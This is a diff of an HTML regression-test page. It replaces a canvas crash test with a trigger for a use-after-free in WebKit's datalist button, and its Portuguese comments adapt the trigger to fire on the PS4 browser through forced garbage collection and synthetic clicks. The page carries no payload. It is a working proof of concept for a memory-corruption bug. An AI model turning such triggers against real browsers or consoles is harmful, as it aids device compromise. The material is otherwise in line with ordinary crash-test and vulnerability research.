@@ -1,28 +1,91 @@
+
 <!DOCTYPE html>
 <html>
-<body>
-<p>This test passes if it does not crash.</p>
-<canvas id="c" width="200" height="200"></canvas>
-<script>
-const ctx = document.getElementById('c').getContext('2d');
-
-// Excede o limite m�ximo de save() para atingir o MaxSaveCount
-for (let i = 0; i < 20000; i++)
-    ctx.save();
-
-// Verifica se o navegador suporta beginLayer antes de cham�-lo
-if (typeof ctx.beginLayer === 'function') {
-    try {
-        ctx.beginLayer();
-        ctx.beginLayer();
-        ctx.beginLayer();
-        console.log("beginLayer executado com sucesso.");
-    } catch (e) {
-        console.log("Erro ao executar beginLayer:", e);
-    }
-} else {
-    console.log("Aviso: ctx.beginLayer n�o � suportado neste ambiente/navegador.");
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<style>
+input {
+    width: 300px;
+    height: 50px;
+    font-size: 18px;
 }
+</style>
+</head>
+<body>
+<h2>Teste de Regressão - DataListButton UAF (Fiel ao Original)</h2>
+<p>Toque no botão da lista ao lado do input para disparar o teste:</p>
+
+<input id="input" type="text" list="list">
+<datalist id="list">
+    <option value="a">
+    <option value="b">
+</datalist>
+
+<div id="result" style="margin-top: 20px; font-family: monospace;"></div>
+
+<script>
+function gc() {
+    if (typeof GCController !== "undefined") {
+        GCController.collect();
+    } else {
+        var gcRec = function (n) {
+            if (n < 1) return {};
+            var temp = {i: "ab" + i + (i / 100000)};
+            temp += "foo";
+            gcRec(n-1);
+        };
+        for (var i = 0; i < 1000; i++)
+            gcRec(10);
+    }
+}
+
+window.addEventListener('load', () => {
+    const input = document.getElementById('input');
+    const result = document.getElementById('result');
+
+    // Listener exatamente como no teste original: muda o tipo para 'button' ao receber o clique do botão interno
+    input.addEventListener('click', (e) => {
+        input.type = 'button';
+        gc();
+        result.innerHTML = '<span style="color: green; font-weight: bold;">PASS if no crash.</span>';
+    }, { once: true });
+
+    // Estratégia para atingir o botão do User Agent no PS4:
+    // Como o shadowRoot é restrito, tentamos acessá-lo via internals se disponível,
+    // ou usamos a posição física da extremidade direita do input (onde o botão de lista é renderizado).
+    setTimeout(() => {
+        let targetElement = null;
+        
+        try {
+            if (window.internals) {
+                let shadow = internals.shadowRoot(input);
+                targetElement = shadow.querySelector("div[useragentpart='-webkit-list-button']");
+            }
+        } catch (err) {
+            console.log("Internals indisponível, usando fallback de coordenadas.");
+        }
+
+        if (targetElement) {
+            // Se o WebKit expuser o elemento de sombra, clicamos nele diretamente
+            targetElement.click();
+        } else {
+            // Fallback geométrico exato para o navegador do PS4:
+            // O botão de autocompletar/datalist fica na extrema direita da caixa do input.
+            const rect = input.getBoundingClientRect();
+            const clickX = rect.right - 20; // 20 pixels da borda direita
+            const clickY = rect.top + (rect.height / 2);
+
+            const clickEvent = new MouseEvent('click', {
+                bubbles: true,
+                cancelable: true,
+                view: window,
+                clientX: clickX,
+                clientY: clickY
+            });
+            input.dispatchEvent(clickEvent);
+        }
+    }, 500);
+});
 </script>
 </body>
 </html>
